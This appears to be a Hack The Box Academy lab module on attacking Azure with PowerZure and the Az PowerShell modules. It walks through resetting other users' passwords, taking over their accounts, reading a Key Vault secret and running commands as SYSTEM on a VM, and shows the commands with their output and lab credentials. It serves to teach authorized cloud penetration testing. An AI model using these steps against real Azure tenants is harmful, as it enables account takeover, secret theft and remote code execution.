We have learned how to enumerate Azure resources using AzureHound, and now we need to understand how to abuse those privileges and misconfigurations to attack the Microsoft Azure cloud.

The creators of `PowerZure` developed a framework to perform enumeration and attacks in Azure environments.

[PowerZure](https://github.com/hausec/PowerZure) is a PowerShell project created to assess and exploit resources within Microsoft’s cloud platform, Azure. This project is very similar to PowerView for Active Directory. In this section, we will explore some uses of PowerZure.

While PowerZure simplifies some offensive operations in Azure, some features may not be available in PowerZure. Due to updates in the Azure cloud, they may only work once they are updated. In such cases, we can use `AzureAD` and `Az` Microsoft PowerShell modules to accomplish our goals.

For more information on using these tools, refer to the official documentation for the [AzureAD](https://learn.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0) and [Az](https://learn.microsoft.com/en-us/powershell/azure/new-azureps-module-az?view=azps-9.4.0) modules, and the [PowerZure project](https://powerzure.readthedocs.io/en/latest/).

## PowerZure

To use PowerZure, we need to sign in to Azure. Open a new PowerShell window as administrator and sign in using Isabella's account:

```powershell
PS C:\Tools\PowerZure> $username = "Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com"
PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxAcademy01!" -AsPlainText -Force
PS C:\Tools\PowerZure> $IsabellaCreds = New-Object System.Management.Automation.PSCredential $username, $password
PS C:\Tools\PowerZure> Connect-AzAccount -Credential $IsabellaCreds

Account                                                  SubscriptionName TenantId                             Environm
                                                                                                               ent
-------                                                  ---------------- --------                             --------
Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com                  92e13faa-6af8-4501-80b9-421271bc3e38 Azure..
```

**Note:** In case we had issues using the option `-Credential` we can still use `Connect-AzAccount` without options to bring up the Azure authentication window.

Then we need to import the PowerZure module:

```powershell
PS C:\Tools\PowerZure> Import-Module .\PowerZure.psd1
8888888b.                                                 ,/    8888888888P
888   Y88b                                              ,'/           d88P
888    888                                            ,' /           d88P
888   d88P  .d88b.  888  888  888  .d88b. 888d888  ,'  /____       d88P    888  888 888d888  .d88b.
8888888P"  d88""88b 888  888  888 d8P  Y8b 888P"  .'____    ,'     d88P     888  888 888P"   d8P  Y8b
888        888  888 888  888  888 88888888 888         /  ,'      d88P      888  888 888     88888888
888        Y88..88P Y88b 888 d88P Y8b.     888        / ,'       d88P       Y88b 888 888     Y8b.
888         "Y88P"   "Y8888888P"   "Y8888  888       /,'        d8888888888  "Y88888 888      "Y8888  version 2.2
                                                    /'

Confused on what to do next? Check out the documentation: https://powerzure.readthedocs.io/ or type Invoke-Powerzure -h for a function table.

Please set your default subscription with Set-AzureSubscription if you have multiple subscriptions. Functions WILL fail if you do not do this. Use Get-AzureCurrentUser to get list your accounts roles & permissions
```

We can use `Invoke-Powerzure -h` to see all available options:

```powershell
PS C:\Tools\PowerZure> Invoke-PowerZure -h

                          PowerZure Version 2.2

                                List of Functions

------------------Info Gathering -------------

Get-AzureADAppOwner ---------------- Returns all owners of all Applications in AAD
Get-AzureADDeviceOwner ------------- Lists the owners of devices in AAD. This will only show devices that have an owner.
Get-AzureADGroupMember ------------- Gathers a specific group or all groups in AzureAD and lists their members.
Get-AzureADRoleMember -------------- Lists the members of a given role in AAD
Get-AzureADUser -------------------- Gathers info on a specific user or all users including their groups and roles in Azure & AzureAD
Get-AzureCurrentUser --------------- Returns the current logged in user name and any owned objects
Get-AzureIntuneScript -------------- Lists available Intune scripts in Azure Intune
Get-AzureLogicAppConnector --------- Lists the connector APIs in Azure
Get-AzureManagedIdentity ----------- Gets a list of all Managed Identities and their roles.
Get-AzurePIMAssignment ------------- Gathers the Privileged Identity Management assignments. Currently, only AzureRM roles are returned.
Get-AzureRole ---------------------- Gets the members of an Azure RBAC role.
Get-AzureRunAsAccount -------------- Finds any RunAs accounts being used by an Automation Account
Get-AzureRolePermission ------------ Finds all roles with a certain permission
Get-AzureSQLDB --------------------- Lists the available SQL Databases on a server
Get-AzureTarget -------------------- Compares your role to your scope to determine what you have access to
Get-AzureTenantId ------------------ Returns the ID of a tenant belonging to a domain
Show-AzureKeyVaultContent ---------- Lists all available content in a key vault
Show-AzureStorageContent ----------- Lists all available storage containers, shares, and tables

------------------Operational --------------

Add-AzureADGroupMember ------------- Adds a user to an Azure AD Group
Add-AzureADRole -------------------- Assigns a specific Azure AD role to a User
Add-AzureADSPSecret ---------------- Adds a secret to a service principal
Add-AzureRole ---------------------- Adds a role to a user in Azure
Connect-AzureJWT ------------------- Logins to Azure using a JWT access token.
Export-AzureKeyVaultContent -------- Exports a Key as PEM or Certificate as PFX from the Key Vault
Get-AzureKeyVaultContent ----------- Get the secrets and certificates from a specific Key Vault or all of them
Get-AzureRunAsCertificate ---------- Will gather a RunAs accounts certificate if one is being used by an automation account, which can then be used to login as that account.
Get-AzureRunbookContent ------------ Gets a specific Runbook and displays its contents or all runbook contents
Get-AzureStorageContent ------------ Gathers a file from a specific blob or File Share
Get-AzureVMDisk -------------------- Generates a link to download a Virtual Machiche’s disk. The link is only available for 24 hours.
Invoke-AzureCommandRunbook --------- Will execute a supplied command or script from a Runbook if the Runbook is configured with a “RunAs” account
Invoke-AzureCustomScriptExtension -- Runs a PowerShell script by uploading it as a Custom Script Extension
Invoke-AzureMIBackdoor ------------- Creates a managed identity for a VM and exposes the REST API on it to make it a persistent JWT backdoor generator.
Invoke-AzureRunCommand ------------- Will run a command or script on a specified VM
Invoke-AzureRunMSBuild ------------- Will run a supplied MSBuild payload on a specified VM.
Invoke-AzureRunProgram ------------- Will run a given binary on a specified VM
Invoke-AzureVMUserDataAgent -------- Deploys the agent used by Invoke-AzureVMUserDataCommand
Invoke-AzureVMUserDataCommand ------ Executes a command using the userData channel on a specified Azure VM.
New-AzureADUser -------------------- Creates a user in Azure Active Directory
New-AzureBackdoor ------------------ Creates a backdoor in Azure via Service Principal
New-AzureIntuneScript -------------- Uploads a PS script to Intune
Set-AzureElevatedPrivileges -------- Elevates the user’s privileges from Global Administrator in AzureAD to include User Access Administrator in Azure RBAC.
Set-AzureSubscription -------------- Sets default subscription. Necessary if in a tenant with multiple subscriptions.
Set-AzureADUserPassword ------------ Sets a user’s password
Start-AzureRunbook ----------------- Starts a Runbook
```

In our initial enumeration, we identified a group named `Subscription Reader` owned by `Charlotte`, an account that Isabella has the right to change the password. Although we have no precise way of guaranteeing that this group has read privileges on the subscription, there is a possibility that the administrator has given read rights to this group on the subscription because of the name it has.

![BloodHound graph showing relationships: ISABELLA.MILLER@... can AZResetPassword for CHARLOTTE.MOORE@..., who AZOwns SUBSCRIPTION READER@DEFAULT DIRECTORY.](https://academy.hackthebox.com/storage/modules/69/azurehound_passwordrest.jpg)

To compromise this group, we must abuse two edges: `AZResetPassword` and `AZOwns`. Let's start by modifying Charlotte's password and then using her account to add herself to the `Subscription Reader` group.

#### Password Reset Charlotte

```powershell
PS C:\Tools\PowerZure> Set-AzureADUserPassword -Username Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com -Password HacktheboxPwnCloud01
```

Now we need to connect to Azure using Charlotte's credentials:

#### Connect as Charlotte

```powershell
PS C:\Tools\PowerZure> $username = "Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com"
PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxPwnCloud01" -AsPlainText -Force
PS C:\Tools\PowerZure> $CharlotteCreds = New-Object System.Management.Automation.PSCredential $username, $password
PS C:\Tools\PowerZure> Connect-AzAccount -Credential $CharlotteCreds

Account                                                  SubscriptionName TenantId                             Environment
-------                                                  ---------------- --------                             -----------
Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com                  92e13faa-6af8-4501-80b9-421271bc3e38 AzureCloud
```

With Charlotte's access, we can now add any user as a member of "Subscription Reader" for simplicity, we will add herself:

#### Adding Charlotte as a member of a group

```powershell
PS C:\Tools\PowerZure> Add-AzureADGroupMember -Group "Subscription Reader" -Username Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com
PS C:\Tools\PowerZure> Get-AzureADGroupMember -Group "Subscription Reader"


@odata.type                     : #microsoft.graph.user
id                              : 0bdf0dca-c1bc-4172-857b-c7b4e539c47b
deletedDateTime                 :
accountEnabled                  : True
ageGroup                        :
businessPhones                  : {}
city                            :
createdDateTime                 : 2023-02-17T15:44:10Z
creationType                    :
companyName                     :
consentProvidedForMinor         :
country                         :
department                      :
displayName                     : Charlotte Moore
...SNIP...
```

Now, we can enumerate the Azure tenant again with Charllote's credentials. If the group has read access for the subscription, we should discover new objects and attack paths:

#### Running AzureHound as Charlotte

```powershell
PS C:\Tools> .\azurehound.exe -u "Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com" -p "HacktheboxPwnCloud01" list --tenant "plaintexthacktheboxgmail.onmicrosoft.com" -o all-charlote.json
AzureHound v1.2.3
Created by the BloodHound Enterprise team - https://bloodhoundenterprise.io

No configuration file located at C:\Users\julio\.config\azurehound\config.json
No configuration file located at C:\Users\julio\.config\azurehound\config.json
2023-02-17T13:49:52-06:00 INF collecting azure objects...
2023-02-17T13:49:53-06:00 INF finished listing all groups count=9
2023-02-17T13:49:53-06:00 INF finished listing all devices count=0
2023-02-17T13:49:53-06:00 INF finished listing all device owners
2023-02-17T13:49:53-06:00 INF finished listing all users count=11
2023-02-17T13:49:53-06:00 INF finished listing all apps count=1
2023-02-17T13:49:53-06:00 INF warning: unable to process azure management groups; either the organization has no management groups or azurehound does not have the reader role on the root management group.
2023-02-17T13:49:53-06:00 INF finished listing all management group role assignments
2023-02-17T13:49:53-06:00 INF finished listing all management group descendants
2023-02-17T13:49:53-06:00 INF finished listing all tenants count=2
2023-02-17T13:49:54-06:00 INF finished listing members for all groups
2023-02-17T13:49:54-06:00 INF finished listing all group owners
2023-02-17T13:49:54-06:00 INF finished listing all app owners
2023-02-17T13:49:54-06:00 INF finished listing all subscriptions count=1
2023-02-17T13:49:54-06:00 INF finished listing all resource groups
2023-02-17T13:49:54-06:00 INF finished listing all subscription role assignments
2023-02-17T13:49:54-06:00 INF finished listing all subscription user access admins
2023-02-17T13:49:54-06:00 ERR unable to continue processing role assignments for this role error="map[error:map[code:Request_ResourceNotFound innerError:map[client-request-id:e7dac294-f86e-4685-8a90-533ff35a8f37 date:2023-02-17T19:49:43 request-id:e7dac294-f86e-4685-8a90-533ff35a8f37] message:Resource 'a0b1b346-4d3e-4e8b-98f8-753987be4970' does not exist or one of its queried reference-property objects are not present.]]" roleDefinitionId=a0b1b346-4d3e-4e8b-98f8-753987be4970
2023-02-17T13:49:54-06:00 INF finished listing all resource group role assignments
2023-02-17T13:49:54-06:00 INF finished listing all service principals count=54
2023-02-17T13:49:54-06:00 INF finished listing all virtual machines
2023-02-17T13:49:55-06:00 INF finished listing all roles count=97
2023-02-17T13:49:55-06:00 INF finished listing all app role assignments
2023-02-17T13:49:55-06:00 INF finished listing all key vaults
2023-02-17T13:49:55-06:00 INF finished listing all service principal owners
2023-02-17T13:49:55-06:00 INF finished listing all key vault role assignments
2023-02-17T13:49:55-06:00 INF finished listing all virtual machine role assignments
2023-02-17T13:49:55-06:00 INF finished listing all role assignments
2023-02-17T13:49:55-06:00 INF collection completed duration=2.6605923s

shutting down gracefully, press ctrl+c again to force
```

Let's import the output `all-charlote.json` to BloodHound and search for the `Transitive Object Control` option for Isabella one more time.

![BloodHound graph showing ISABELLA.MILLER@... with AZResetPassword permissions for multiple users, including AVA.TAYLOR@... and MADISON.JOHNSON@.... Connections to resources like PRODUCTION, AZVM-01, and groups like HR GROUP@DEFAULT DIRECTORY.](https://academy.hackthebox.com/storage/modules/69/azurehound_newpaths.jpg)

We had 3 new object a [Key Vault](https://learn.microsoft.com/en-us/azure/key-vault/general/basic-concepts), a [Resource Group](https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/manage-resource-groups-portal#what-is-a-resource-group) and a [Virtual Machine](https://learn.microsoft.com/en-us/azure/virtual-machines/overview). Let's explore how we can read the contents of the Azure Key Vault and how to execute commands in Azure VM. We will leave the resource group exercise so you can investigate how to abuse it.

## Reading an Azure Key Vault

Azure Key Vault is a cloud service for securely storing and accessing secrets. A secret is anything that you want to tightly control access to, such as API keys, passwords, certificates, or cryptographic keys.

We can use BloodHound to identify the attack path from `Isabella` to the Key Vault `HTB-SECRETPLAINTEXT96519`:

![BloodHound graph showing ISABELLA.MILLER@... with AZResetPassword permission for AVA.TAYLOR@..., who is an AZContributor to HTB-SECRETPLAINTEXT96519.](https://academy.hackthebox.com/storage/modules/69/azurehound_keyvault_path.jpg)

To execute this attack, we will have to reset Ava Taylor's credentials, log in as Ava Taylor and then use the Powershell Az module to read the contents of the Key Vault.

To reset Ava Taylor's password, we will have to log in as Isabella:

```powershell
PS C:\Tools\PowerZure> $username = "Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com"
PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxAcademy01!" -AsPlainText -Force
PS C:\Tools\PowerZure> $IsabellaCreds = New-Object System.Management.Automation.PSCredential $username, $password
PS C:\Tools\PowerZure> Connect-AzAccount -Credential $IsabellaCreds

Account                                                  SubscriptionName TenantId                             Environment
-------                                                  ---------------- --------                             -----------
Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com                  92e13faa-6af8-4501-80b9-421271bc3e38 AzureCloud
```

#### Reset Ava Taylor's Credentials

```powershell
PS C:\Tools\PowerZure> Set-AzureADUserPassword -Username Ava.Taylor@plaintexthacktheboxgmail.onmicrosoft.com -Password HacktheboxPwnCloud01
```

#### Connect as Ava Taylor

```powershell
PS C:\Tools\PowerZure> $username = "Ava.Taylor@plaintexthacktheboxgmail.onmicrosoft.com"
PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxPwnCloud01" -AsPlainText -Force
PS C:\Tools\PowerZure> $AvaCreds = New-Object System.Management.Automation.PSCredential $username, $password
PS C:\Tools\PowerZure> Connect-AzAccount -Credential $AvaCreds

Account                                             SubscriptionName     TenantId                             Environment
-------                                             ----------------     --------                             -----------
Ava.Taylor@plaintexthacktheboxgmail.onmicrosoft.com Azure subscription 1 92e13faa-6af8-4501-80b9-421271bc3e38 AzureCloud
```

To retrieve the password, we will use the Az PowerShell module instead of PowerZure. A Key Vault can have multiple secrets, keys, and certificates. We need to get the name of the secret within the Key Vault:

#### Search Azure Key Vault Secret name

```powershell
PS C:\Tools> Get-AzKeyVaultSecret -VaultName HTB-SECRETPLAINTEXT96519
Vault Name   : htb-secretplaintext96519
Name         : HTBKeyVault
Version      :
Id           : https://htb-secretplaintext96519.vault.azure.net:443/secrets/HTBKeyVault
Enabled      : True
Expires      :
Not Before   :
Created      : 2/17/2023 4:44:48 PM
Updated      : 2/17/2023 4:44:48 PM
Content Type :
Tags         :
```

The name is `HTBKeyVault`. Now we need to get the secret. The secret is stored as a secure string, and we need to convert its value back to plain text.

#### Getting the Secret in the Azure Key Vault

```powershell
PS C:\Tools> $secret = Get-AzKeyVaultSecret -VaultName HTB-SECRETPLAINTEXT96519 -Name HTBKeyVault
PS C:\Tools> [System.Net.NetworkCredential]::new('', $secret.SecretValue).Password
ImHack1nGTooM4ch!
```

**Note:** There's an option in PowerZure to read the content of the Key Vault, but it was not working properly at the time of writing this module.

## Execute Commands in Azure VM

An Azure virtual machine gives you the flexibility of virtualization without buying and maintaining the physical hardware that runs it. However, you still need to maintain the virtual machine by performing tasks such as configuring, patching, and installing the software that runs on it.

We can use BloodHound to identify the attack path from `Isabella` to the Key Vault `AZVM-01`:

![BloodHound graph showing ISABELLA.MILLER@... with AZResetPassword permission for MADISON.JOHNSON@..., who AZOwns AZVM-01.](https://academy.hackthebox.com/storage/modules/69/azurehound_VM_path.jpg)

To execute this attack, we will have to reset Madison Johnson's credentials, log in as Madison Johnson and then use the `PowerZure` module to execute command in the VM. We will also demonstrate how to do the same with the PowerShell `Az` module.

To reset Madison Johnson's password, we will have to log in as Isabella:

#### Connect as Isabella to reset Madison's password

```powershell
PS C:\Tools\PowerZure> $username = "Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com"
PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxAcademy01!" -AsPlainText -Force
PS C:\Tools\PowerZure> $IsabellaCreds = New-Object System.Management.Automation.PSCredential $username, $password
PS C:\Tools\PowerZure> Connect-AzAccount -Credential $IsabellaCreds

Account                                                  SubscriptionName TenantId                             Environment
-------                                                  ---------------- --------                             -----------
Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com                  92e13faa-6af8-4501-80b9-421271bc3e38 AzureCloud
```

#### Reset Madison Johnson Credentials

```powershell
PS C:\Tools\PowerZure> Set-AzureADUserPassword -Username Madison.Johnson@plaintexthacktheboxgmail.onmicrosoft.com -Password HacktheboxPwnCloud01
```

#### Connect as Madison Johnson

```powershell
PS C:\Tools\PowerZure> $username = "Madison.Johnson@plaintexthacktheboxgmail.onmicrosoft.com"
PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxPwnCloud01" -AsPlainText -Force
PS C:\Tools\PowerZure> $MadisonCreds = New-Object System.Management.Automation.PSCredential $username, $password
PS C:\Tools\PowerZure> Connect-AzAccount -Credential $MadisonCreds

Account                                                  SubscriptionName     TenantId                             Environment
-------                                                  ----------------     --------                             -----------
Madison.Johnson@plaintexthacktheboxgmail.onmicrosoft.com Azure subscription 1 92e13faa-6af8-4501-80b9-421271bc3e38 AzureCloud
```

To use PowerZure to execute commands on a VM, we can use the `Invoke-AzureRunCommand` commandlet with the arguments `VMName` and `Command` to specify the command we want to execute.

#### Execute Commands in Azure VM using PowerZure

```powershell
PS C:\Tools> Invoke-AzureRunCommand -VMName "AZVM-01" -Command whoami
VERBOSE: Performing the operation "Invoke" on target "AZVM-01".
nt authority\system
```

To use the `Az` module, we need to provide a few more arguments: `-ResourceGroupName`, which is `Production`, set `-CommandId` to `RunPowerShellScript` with `-ScriptString` and specify the command we want to run on the machine, in this case, `whoami`:

#### Execute Commands in Azure VM using Az PowerShell Module

```powershell
PS C:\Tools> Invoke-AzVMRunCommand -ResourceGroupName "PRODUCTION" -CommandId "RunPowerShellScript" -VMName "AZVM-01" -ScriptString "whoami"

Value[0]        :
  Code          : ComponentStatus/StdOut/succeeded
  Level         : Info
  DisplayStatus : Provisioning succeeded
  Message       : nt authority\system
Value[1]        :
  Code          : ComponentStatus/StdErr/succeeded
  Level         : Info
  DisplayStatus : Provisioning succeeded
  Message       :
Status          : Succeeded
Capacity        : 0
Count           : 0
```
